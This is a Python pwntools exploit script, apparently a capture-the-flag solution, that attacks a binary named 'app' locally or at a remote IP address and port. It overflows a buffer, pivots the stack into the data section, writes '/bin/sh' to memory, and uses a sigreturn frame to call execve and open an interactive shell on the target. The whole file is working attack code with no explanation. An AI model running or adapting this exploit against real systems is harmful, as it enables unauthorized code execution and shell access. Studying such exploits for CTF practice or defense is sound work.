#!/usr/bin/env python3

from pwn import *

exe = ELF("./app")

context.binary = exe

gdb_script = """
b *main
c
"""

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdb_script)
    else:
        r = remote("157.180.85.167", 20007)

    return r


pop_rax = 0x401139
vuln_read = 0x401147
data_section = 0x404050
syscall = 0x401136
offset = 72
frame = SigreturnFrame()
frame.rax = 59
frame.rdi = data_section
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall

def main():
    r = conn()
    # good luck pwning :)
    payload = flat(
        b'A' * 64,
        data_section,
        pop_rax,
        data_section,
        vuln_read
    )
    # payload += b'\x90' * (offset - len(payload))
    r.sendline(payload)
    
    binsh = b"/bin/sh\x00"
    
    payload2 = flat(
        binsh,
        pop_rax, 0xf,
        syscall,
        frame
    )
    r.sendline(payload2)
    r.interactive()


if __name__ == "__main__":
    main()
